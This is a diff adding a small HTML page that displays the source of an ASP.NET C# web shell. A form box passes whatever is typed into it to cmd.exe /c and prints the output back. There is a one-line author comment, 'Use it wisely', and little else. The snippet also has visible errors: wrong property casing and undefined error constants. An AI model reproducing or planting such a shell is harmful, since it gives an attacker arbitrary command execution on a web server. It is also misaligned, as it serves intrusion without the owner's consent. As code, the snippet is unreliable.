@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Newer with .NET C#</title>
+</head><body>&lt;%@ Import Namespace="System" %&gt;<br/>
+&lt;%@ Import Namespace="System.Diagnostics" %&gt;<br/>
+&lt;script language="C#" runat="server"&gt;<br/>
+private void doit(object sender, EventArgs e)<br/>
+{<br/>
+try {<br/>
+System.Diagnostics.Process p = new Process();<br/>
+p.StartInfo.CreateNoWindow = false;<br/>
+p.StartInfo.RedirectStandardOutput = true;<br/>
+p.StartInfo.FileName = "%systemroot%\\system32\\cmd.exe";<br/>
+p.StartInfo.Arguments = "/c " + txtcmd.text;<br/>
+p.Start();<br/>
+string output = p.StandardOutput.ReadToEnd();<br/>
+message.text = output.text;<br/>
+}<br/>
+catch (Win32Exception e)<br/>
+{<br/>
+if(e.NativeErrorCode == ERROR_FILE_NOT_FOUND)<br/>
+{<br/>
+message.text = e.Message;<br/>
+} <br/>
+else if (e.NativeErrorCode == ERROR_ACCESS_DENIED)<br/>
+{<br/>
+message.text = "Access DENIED!";<br/>
+}<br/>
+}<br/>
+}&lt;/script&gt;<br/>
+&lt;form ID="Form1" runat=server&gt;<br/>
+Command: &lt;asp:TextBox id=txtcmd Runat=server /&gt;<br/>
+&lt;asp:Button Text="Submit" OnClick="doit" Runat=server /&gt;<br/>
+&lt;asp:Label id=message ForeColor="#ff0000" Runat=server /&gt;<br/>
+&lt;/form&gt;<br/>
+&lt;/body&gt;<br/>
+&lt;/html&gt;<br/>
+<br/>
+Not much really to explain here. I created some process objects (Process Object) and passed the contents back to the user. Use it wisely. <br/>
+<br/>
+</body></html>
